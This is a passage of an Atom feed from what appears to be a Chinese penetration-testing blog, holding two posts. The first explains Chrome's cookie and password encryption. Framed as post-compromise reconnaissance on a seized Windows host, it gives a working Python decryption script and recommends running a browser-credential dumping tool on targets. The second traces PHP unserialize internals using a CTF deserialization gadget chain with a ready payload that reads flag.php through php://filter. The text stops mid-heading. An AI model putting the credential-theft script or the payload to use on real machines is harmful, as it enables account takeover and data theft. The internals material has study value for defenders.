<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>knight&#39;blog</title>
  
  
  <link href="/knightswd.github.io/atom.xml" rel="self"/>
  
  <link href="https://knightswd.github.io/"/>
  <updated>2020-08-03T11:37:18.470Z</updated>
  <id>https://knightswd.github.io/</id>
  
  <author>
    <name>knight</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>chrome浏览器cookie及密码解密</title>
    <link href="https://knightswd.github.io/2020/08/03/chrome%E6%B5%8F%E8%A7%88%E5%99%A8cookie%E5%8F%8A%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/"/>
    <id>https://knightswd.github.io/2020/08/03/chrome%E6%B5%8F%E8%A7%88%E5%99%A8cookie%E5%8F%8A%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/</id>
    <published>2020-08-03T11:25:20.000Z</published>
    <updated>2020-08-03T11:37:18.470Z</updated>
    
    <content type="html"><![CDATA[<h1 id="chrome浏览器cookie及密码解密"><a href="#chrome浏览器cookie及密码解密" class="headerlink" title="chrome浏览器cookie及密码解密"></a>chrome浏览器cookie及密码解密</h1><p>写在前面：在我们进行内网信息收集的时候，控制了一台windows主机，一定需要继续进行信息收集，目标主机的浏览器中缓存的账户名，密码，浏览历史也是我们收集的重点之一，本文主要是介绍如何通过我们在目标主机上找到的chrome文件来获取用户的密码、cookie。</p><h2 id="chrome中的敏感文件位置"><a href="#chrome中的敏感文件位置" class="headerlink" title="chrome中的敏感文件位置"></a>chrome中的敏感文件位置</h2><p>当chrome&lt;80.x版本时，仅仅使用dpapi进行解密就行，在chrome&gt;=80.x时使用的是AES-256-GCM的AEAD对称加密。本文主要是讲chrome如何实现此加密算法。</p><p>首先我们得清楚，在chrome中的敏感文件存储的位置。</p><p>chrome的cookie存储的位置是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Thinkpad\AppData\Local\Google\Chrome\User Data\Default\Cookies</span><br></pre></td></tr></table></figure><p>chrome的浏览器历史文件History存储的位置是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Thinkpad\AppData\Local\Google\Chrome\User Data\Default\History</span><br></pre></td></tr></table></figure><p>chrome的登陆账号密码文件Login Data文件存储位置是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Thinkpad\AppData\Local\Google\Chrome\User Data\Default\Login Data</span><br></pre></td></tr></table></figure><p>chrome中存储加密key的位置是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Thinkpad\AppData\Local\Google\Chrome\User Data\Local State</span><br></pre></td></tr></table></figure><p>其中Cookies、History、Login Data是SQLite3文件，其中大部分文件是可以直接看见的，对于具体cookie值和账号密码是使用encrypted_value、password_value来进行存储具体存储形式见下图</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/08/03/chrome%E6%B5%8F%E8%A7%88%E5%99%A8cookie%E5%8F%8A%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/1.jpg" alt="img"></p><p>在此处我们先来了解下密文的格式。在密文的前三个字符是<code>v10</code>（chrome的cookie都是用的此加密开头），在后面的</p><p>12个字符是nonce，在之后的才是真正的密文</p><p>而Local State则是一种json格式的文件</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/08/03/chrome%E6%B5%8F%E8%A7%88%E5%99%A8cookie%E5%8F%8A%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/2.jpg" alt="img"></p><p>其中os_crypt的encrypted_key的值中保存着需要用到的解密密钥。</p><h2 id="具体加密过程"><a href="#具体加密过程" class="headerlink" title="具体加密过程"></a>具体加密过程</h2><p><a href="'https://source.chromium.org/chromium/chromium/src/+/master:components/os_crypt/os_crypt_win.cc;drc=aaccac3ad5fd67af8e9a98b60ad7951eb73cbb67;bpv=0;bpt=1;l=33?originalUrl=https:%2F%2Fcs.chromium.org%2F'">这里</a>是chrome的具体加解密文件。</p><p><strong>变量含义</strong></p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/08/03/chrome%E6%B5%8F%E8%A7%88%E5%99%A8cookie%E5%8F%8A%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/3.jpg" alt="img"></p><blockquote><p>1、密钥存储的json位置</p><p>2、密钥的长度</p><p>3、nonce的长度</p><p>4、最后密文的版本前缀</p><p>5、对key的加密算法前缀</p></blockquote><p><strong>具体代码</strong>：</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/08/03/chrome%E6%B5%8F%E8%A7%88%E5%99%A8cookie%E5%8F%8A%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/4.jpg" alt="img"></p><p>1、其中执行的核心代码是</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/08/03/chrome%E6%B5%8F%E8%A7%88%E5%99%A8cookie%E5%8F%8A%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/5.jpg" alt="img"></p><p>即申请一个静态变量encryption_key</p><p>2、初始化key</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/08/03/chrome%E6%B5%8F%E8%A7%88%E5%99%A8cookie%E5%8F%8A%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/6.jpg" alt="img"></p><p>初始化key的具体步骤：</p><blockquote><p>随机生成kKeyLength长度的key–&gt;用dpapi加密key–&gt;key的最前面添加’DPAPI’–&gt;base64编码key–&gt;保存进json文件</p></blockquote><p>3、随机生成kNonceLength长度的nonce</p><p>4、将nonce插入到密文的前缀（这就是我们看见的那十二个字符的nonce）</p><p>5、将版本号插入到密文的前缀</p><p>最后在看下整个加密流程</p><p><img src= data:image/gif;base64,R0lGODdhAQABAPAAAMPDwwAAACwAAAAAAQABAAACAkQBADs= data-src="/2020/08/03/chrome%E6%B5%8F%E8%A7%88%E5%99%A8cookie%E5%8F%8A%E5%AF%86%E7%A0%81%E8%A7%A3%E5%AF%86/7.jpg" alt="img"></p><h2 id="解密流程"><a href="#解密流程" class="headerlink" title="解密流程"></a>解密流程</h2><p>使用之前请安装</p><p><code>pip install cryptography</code></p><p>此python脚本在windows下运行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.backends <span class="keyword">import</span> default_backend</span><br><span class="line"><span class="keyword">from</span> cryptography.hazmat.primitives.ciphers <span class="keyword">import</span> Cipher, algorithms, modes</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dpapi_decrypt</span><span class="params">(encrypted)</span>:</span></span><br><span class="line">    <span class="keyword">import</span> ctypes</span><br><span class="line">    <span class="keyword">import</span> ctypes.wintypes</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DATA_BLOB</span><span class="params">(ctypes.Structure)</span>:</span></span><br><span class="line">        _fields_ = [(<span class="string">'cbData'</span>, ctypes.wintypes.DWORD),</span><br><span class="line">                    (<span class="string">'pbData'</span>, ctypes.POINTER(ctypes.c_char))]</span><br><span class="line"></span><br><span class="line">    p = ctypes.create_string_buffer(encrypted, len(encrypted))</span><br><span class="line">    blobin = DATA_BLOB(ctypes.sizeof(p), p)</span><br><span class="line">    blobout = DATA_BLOB()</span><br><span class="line">    retval = ctypes.windll.crypt32.CryptUnprotectData(</span><br><span class="line">        ctypes.byref(blobin), <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="literal">None</span>, <span class="number">0</span>, ctypes.byref(blobout))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> retval:</span><br><span class="line">        <span class="keyword">raise</span> ctypes.WinError()</span><br><span class="line">    result = ctypes.string_at(blobout.pbData, blobout.cbData)</span><br><span class="line">    ctypes.windll.kernel32.LocalFree(blobout.pbData)</span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line">encrypted_txt = base64.b64decode(<span class="string">'djEwS/5dxDCXaTsRRJkiZohykDrUJ3sbhd6liWO98+4GmGdA7RJ3GXw='</span>)//原始数据的base64编码形式</span><br><span class="line">encoded_key = <span class="string">'RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACndkJq2ysFTriHlfW0nUWtAAAAAAIAAAAAAANmAADAAAAAEAAAAKC1hRGlISNIKzcIVQIfSiIAAAAABIAAAKAAAAAQAAAA6Nq3v8LZfNmbwZi0krzKBCgAAACZD/ab6dhDiCscPTusjXTYmT9Ht/ohQNIQ6WG+VYPjyDZasXsxbNbmFAAAAJ4WfytFybhjSIuPgxCzB9gvyLUc'</span>//Local State中保存的encrypted_key</span><br><span class="line">encrypted_key = base64.b64decode(encoded_key.encode())</span><br><span class="line">encrypted_key = encrypted_key[<span class="number">5</span>:]</span><br><span class="line">key = dpapi_decrypt(encrypted_key)</span><br><span class="line">nonce = encrypted_txt[<span class="number">3</span>:<span class="number">15</span>]</span><br><span class="line">cipher = Cipher(algorithms.AES(key), <span class="literal">None</span>, backend=default_backend())</span><br><span class="line">cipher.mode = modes.GCM(nonce)</span><br><span class="line">decryptor = cipher.decryptor()</span><br><span class="line">result = decryptor.update(encrypted_txt[<span class="number">15</span>:])</span><br><span class="line">print(result)</span><br></pre></td></tr></table></figure><p>通过此方法就可以获得chrome下保存的密码了。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>在此处推荐一个个人觉得好用的dump浏览器密码的工具————–<a href="https://github.com/moonD4rk/HackBrowserData" target="_blank" rel="noopener">HackBrowserData</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">PS C:\test&gt; .\hack-browser-data.exe -h</span><br><span class="line">NAME:</span><br><span class="line">   hack-browser-data - Export passwords&#x2F;cookies&#x2F;history&#x2F;bookmarks from browser</span><br><span class="line"></span><br><span class="line">USAGE:</span><br><span class="line">   [hack-browser-data -b chrome -f json -dir results -e all]</span><br><span class="line">   Get all data(password&#x2F;cookie&#x2F;history&#x2F;bookmark) from chrome</span><br><span class="line"></span><br><span class="line">GLOBAL OPTIONS:</span><br><span class="line">   --verbose, --vv                   Verbose (default: false)</span><br><span class="line">   --browser value, -b value         Available browsers: all|chrome|edge|firefox (default: &quot;all&quot;)</span><br><span class="line">   --results-dir value, --dir value  Export dir (default: &quot;results&quot;)</span><br><span class="line">   --format value, -f value          Format, csv|json|console (default: &quot;json&quot;)</span><br><span class="line">   --export-data value, -e value     all|cookie|history|password|bookmark (default: &quot;all&quot;)</span><br></pre></td></tr></table></figure><p>此工具是用go写的，所以可以直接生成windows下的exe文件，当我们cs上线目标后，在目标主机上运行此文件就可在同目录下生成账户密码和cookie了，此exe文件6.1M。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p>1、<a href="http://www.meilongkui.com/archives/1904" target="_blank" rel="noopener">Chrome浏览器Cookie及密码解密的分析过程及Java实现（Windows平台下v10及以上Cookie文件encrypted_value及Login Data文件password_value的解密</a></p><p>2、<a href="https://mp.weixin.qq.com/s/lhlV43ka7_QM72CS6FVr_g" target="_blank" rel="noopener">Chrome 80.X版本如何解密Cookies文件</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;chrome浏览器cookie及密码解密&quot;&gt;&lt;a href=&quot;#chrome浏览器cookie及密码解密&quot; class=&quot;headerlink&quot; title=&quot;chrome浏览器cookie及密码解密&quot;&gt;&lt;/a&gt;chrome浏览器cookie及密码解密&lt;/h1&gt;&lt;
      
    
    </summary>
    
    
      <category term="内网渗透" scheme="https://knightswd.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
      <category term="内网渗透" scheme="https://knightswd.github.io/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
      <category term="信息收集" scheme="https://knightswd.github.io/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"/>
    
  </entry>
  
  <entry>
    <title>php内核学习(三)</title>
    <link href="https://knightswd.github.io/2020/03/29/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%89/"/>
    <id>https://knightswd.github.io/2020/03/29/php%E5%86%85%E6%A0%B8%E5%AD%A6%E4%B9%A0-%E4%B8%89/</id>
    <published>2020-03-29T09:10:45.000Z</published>
    <updated>2020-05-20T14:31:42.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="php内核学习三"><a href="#php内核学习三" class="headerlink" title="php内核学习三"></a>php内核学习三</h1><h2 id="一、前沿"><a href="#一、前沿" class="headerlink" title="一、前沿"></a>一、前沿</h2><p>本次主要是从内核层看php反序列化的整个过程，下面贴代码(来自MRctf的ezpop)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">Welcome to index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//flag is in flag.php</span></span><br><span class="line"><span class="comment">//WTF IS THIS?</span></span><br><span class="line"><span class="comment">//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95</span></span><br><span class="line"><span class="comment">//And Crack It!</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Modifier</span> </span>&#123;</span><br><span class="line">    <span class="keyword">protected</span>  $var;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">append</span><span class="params">($value)</span></span>&#123;</span><br><span class="line">        <span class="keyword">include</span>($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;append(<span class="keyword">$this</span>-&gt;var);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Show</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $source;</span><br><span class="line">    <span class="keyword">public</span> $str;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file=<span class="string">'index.php'</span>)</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;source = $file;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">'Welcome to '</span>.<span class="keyword">$this</span>-&gt;source.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;str-&gt;source;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">"/gopher|http|file|ftp|https|dict|\.\./i"</span>, <span class="keyword">$this</span>-&gt;source)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">"hacker"</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;source = <span class="string">"index.php"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $p;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;p = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span><span class="params">($key)</span></span>&#123;</span><br><span class="line">        $function = <span class="keyword">$this</span>-&gt;p;</span><br><span class="line">        <span class="keyword">return</span> $function();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c=<span class="string">'O%3A4%3A%22show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3Bs%3A3%3A%22aaa%22%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A3%3A%22var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D'</span>;</span><br><span class="line">$a=urldecode($c);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($a))&#123;</span><br><span class="line">    @unserialize($a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Show;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="二、具体函数及功能"><a href="#二、具体函数及功能" class="headerlink" title="二、具体函数及功能"></a>二、具体函数及功能</h2><p>前面到函数的执行 过程就不一一缀述了下面直接从unserialize函数开始</p><h3 id="var-c-PHP-FUNCTION-unserialize"><a href="#var-c-PHP-FUNCTION-unserialize" class="headerlink" title="var.c  PHP_FUNCTION(unserialize)"></a>var.c  PHP_FUNCTION(unserialize)</h3><p>在此函数中先进行初始化进入 </p><p><strong>PHP_VAR_UNSERIALIZE_INIT(var_hash)</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (BG(serialize_lock) || !BG(unserialize).level) &#123;</span><br><span class="line">d = emalloc(<span class="keyword">sizeof</span>(struct php_unserialize_data));</span><br><span class="line">d-&gt;last = &amp;d-&gt;entries;</span><br><span class="line">d-&gt;first_dtor = d-&gt;last_dtor = <span class="literal">NULL</span>;</span><br><span class="line">d-&gt;allowed_classes = <span class="literal">NULL</span>;</span><br><span class="line">d-&gt;ref_props = <span class="literal">NULL</span>;</span><br><span class="line">d-&gt;cur_depth = <span class="number">0</span>;</span><br><span class="line">d-&gt;max_depth = BG(unserialize_max_depth);</span><br><span class="line">d-&gt;entries.used_slots = <span class="number">0</span>;</span><br><span class="line">d-&gt;entries.next = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">if</span> (!BG(serialize_lock)) &#123;</span><br><span class="line">BG(unserialize).data = d;</span><br><span class="line">BG(unserialize).level = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">d = BG(unserialize).data;</span><br><span class="line">++BG(unserialize).level;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处建立一个名为<code>php_unserialize_data_t</code>结构体,其中保存着和反序列化相关的信息。</p><p>在初始化反序列化后，进入</p><h3 id="var-unserialize-re-php-var-unserialize-retval-amp-p-p-buf-len-amp-var-hash"><a href="#var-unserialize-re-php-var-unserialize-retval-amp-p-p-buf-len-amp-var-hash" class="headerlink" title="var_unserialize.re  php_var_unserialize(retval, &amp;p, p + buf_len, &amp;var_hash)"></a>var_unserialize.re  php_var_unserialize(retval, &amp;p, p + buf_len, &amp;var_hash)</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">PHPAPI <span class="keyword">int</span> <span class="title">php_var_unserialize</span><span class="params">(UNSERIALIZE_PARAMETER)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">var_entries *orig_var_entries = (*var_hash)-&gt;last;</span><br><span class="line">zend_long orig_used_slots = orig_var_entries ? orig_var_entries-&gt;used_slots : <span class="number">0</span>;</span><br><span class="line"><span class="keyword">int</span> result;</span><br><span class="line"></span><br><span class="line">result = php_var_unserialize_internal(UNSERIALIZE_PASSTHRU, <span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>此处进入反序列化处理的关键函数</p><h3 id="var-unserialize-re-php-var-unserialize-internal"><a href="#var-unserialize-re-php-var-unserialize-internal" class="headerlink" title="var_unserialize.re php_var_unserialize_internal()"></a>var_unserialize.re php_var_unserialize_internal()</h3><p>先进行词法解析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'a'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'O'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'C'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &gt;= <span class="string">'C'</span>) <span class="keyword">goto</span> yy4;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'M'</span>) <span class="keyword">goto</span> yy2;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'N'</span>) <span class="keyword">goto</span> yy5;</span><br><span class="line"><span class="keyword">goto</span> yy4;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'R'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &gt;= <span class="string">'R'</span>) <span class="keyword">goto</span> yy6;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'S'</span>) <span class="keyword">goto</span> yy7;</span><br><span class="line"><span class="keyword">if</span> (yych &gt;= <span class="string">'a'</span>) <span class="keyword">goto</span> yy8;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'i'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'c'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'b'</span>) <span class="keyword">goto</span> yy9;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'d'</span>) <span class="keyword">goto</span> yy10;</span><br><span class="line"><span class="keyword">if</span> (yych &gt;= <span class="string">'i'</span>) <span class="keyword">goto</span> yy11;</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'s'</span>) &#123;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'q'</span>) <span class="keyword">goto</span> yy2;</span><br><span class="line"><span class="keyword">if</span> (yych &lt;= <span class="string">'r'</span>) <span class="keyword">goto</span> yy12;</span><br><span class="line"><span class="keyword">goto</span> yy13;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (yych == <span class="string">'&#125;'</span>) <span class="keyword">goto</span> yy14;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这是所有的类型名，解析出开头的字符O,然后进入object的解析流程，在object解析流程中有，会有取类名长度的操作：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;<span class="comment">//通过while循环来取数字</span></span><br><span class="line"><span class="built_in">cursor</span> = *p;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">cursor</span> &gt;= <span class="string">'0'</span> &amp;&amp; <span class="built_in">cursor</span> &lt;= <span class="string">'9'</span>) &#123;</span><br><span class="line">result = result * <span class="number">10</span> + (<span class="keyword">size_t</span>)(<span class="built_in">cursor</span> - (<span class="keyword">unsigned</span> <span class="keyword">char</span>)<span class="string">'0'</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line">p++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>取完类名长度后后执行初始化类名变量的操作<code>class_name = zend_string_init(str, len, 0);</code></p><p>之后再判断反序列化的类是不是被允许的类(这是php7的一个新特性，可以控制允许进行反序列化操作的类)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if(!unserialize_allowed_class(class_name, var_hash)) &#123;</span><br><span class="line">incomplete_class &#x3D; 1;</span><br><span class="line">ce &#x3D; PHP_IC_ENTRY;</span><br><span class="line">break;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>之后开始根据传人的类名寻找类<code>ce = zend_lookup_class(class_name);</code></p><h3 id="zend-execute-api-c-zend-lookup-class-ex"><a href="#zend-execute-api-c-zend-lookup-class-ex" class="headerlink" title="zend_execute_api.c 